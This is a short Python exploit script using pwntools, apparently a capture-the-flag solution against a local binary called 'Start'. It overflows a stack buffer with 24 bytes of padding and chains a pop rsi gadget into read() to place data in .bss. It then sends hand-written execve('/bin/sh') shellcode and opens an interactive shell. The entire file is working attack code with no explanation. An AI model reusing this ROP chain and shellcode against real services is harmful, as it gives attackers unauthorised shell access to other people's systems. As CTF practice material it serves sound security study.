#!/usr/bin/env pyhton
from pwn import *
import time

context(os="linux", arch="amd64") # 64bit (not arch="i686")

# conn.send(payload) -> read_plt -> conn.send(shellcraft.sh()) -> exec shellcode
def main():
    conn = process("./Start")

    pop_rsi  = 0x4005c1  # pop rsi ; pop r15 ; ret
    bss_addr = 0x601038
    read_plt = 0x400400

    shellcode = "\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x31\xf6\x56\x53\x54\x5f\xb0\x3b\x31\xd2\x0f\x05"

    payload = "A" * 24
    payload += p64(pop_rsi) # rsi is the second argument of "read"
    payload += p64(bss_addr)
    payload += p64(0x41) # padding
    payload += p64(read_plt) # read(rdi, rsi(bss_addr), rdx)
    payload += p64(bss_addr)

    conn.send(payload)

    sleep(0.1)

    # conn.send(asm(shellcraft.sh()))
    conn.send(shellcode)
    conn.interactive()


if __name__ == "__main__":
    main()
